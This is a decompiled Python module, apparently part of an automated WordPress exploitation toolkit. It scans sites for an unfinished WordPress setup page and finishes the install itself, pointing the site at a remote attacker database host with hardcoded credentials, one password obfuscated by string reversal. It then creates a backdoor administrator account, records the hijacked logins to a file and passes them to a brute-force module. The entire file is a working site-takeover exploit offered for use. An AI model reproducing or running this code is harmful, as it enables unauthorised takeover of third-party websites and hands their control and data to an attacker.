# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\wpinstall.py
from Exploits import printModule
import requests
from random import sample
from BruteForce import Wordpress
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0'}
HOST = '31.210.78.238'
USER = 'francesco_res'
PASS = 'L30zDTZDTP'[::-1]
DB = 'francesco_reservex'
username = 'u1337'
password = 'uAdmin@123'

def RandomGenerator(lenth):
    return ''.join(sample('abcdefghijklmnopqrstuvwxyz', lenth))


def WpInstall(site, Email):
    session = requests.Session()
    RandomStringForPREFIX = str('wp_' + str(RandomGenerator(8)) + '_')
    try:
        DATA = {'dbname': DB,'uname': USER,
           'pwd': PASS,
           'dbhost': HOST,
           'prefix': RandomStringForPREFIX,
           'language': 'en_US',
           'submit': 'Submit'
           }
        A = session.post('http://' + site + '/wp-admin/setup-config.php?step=2', data=DATA, headers=Headers, timeout=10)
        POSTDATA_Install = {'weblog_title': 'installed|jex',
           'user_name': username,
           'admin_password': password,
           'pass1-text': password,
           'admin_password2': password,
           'pw_weak': 'on',
           'admin_email': Email,
           'Submit': 'Install+WordPress',
           'language': 'en_US'
           }
        session.post('http://' + site + '/wp-admin/install.php?step=2', data=POSTDATA_Install, headers=Headers, timeout=25)
    except:
        pass

    try:
        source = session.get('http://' + site + '/wp-login.php', timeout=10, headers=Headers).content
        if 'installed|jex' in str(source):
            with open('result/Wp-Installed.txt', 'a') as writer:
                writer.write(site + '/wp-login.php\n  Username: {}\n  Password: {}\n------------------------------------------\n'.format(username, password))
            Login = Wordpress.Wordpress()
            Login.BruteForce(site, password, username)
            return printModule.returnYes(site, 'N/A', 'Wp-Install', 'Wordpress')
        with open('result/Wp-SetupFound.txt', 'a') as writer:
            writer.write('{}/wp-admin/setup-config.php\n'.format(site))
        return printModule.returnNo(site, 'N/A', 'Wp-Install', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Wp-Install', 'Wordpress')


def Check(site, email):
    try:
        PATHz = [
         '',
         '/wordpress',
         '/wp',
         '/blog',
         '/test',
         '/site']
        x = 0
        for path in PATHz:
            C = requests.get('http://' + site + path + '/wp-admin/setup-config.php?step=0')
            if 'setup-config.php?step=1' in str(C.content):
                x += 1
                return WpInstall(site + path, email)

        if x == 0:
            return printModule.returnNo(site, 'N/A', 'Wp-Install', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Wp-Install', 'Wordpress')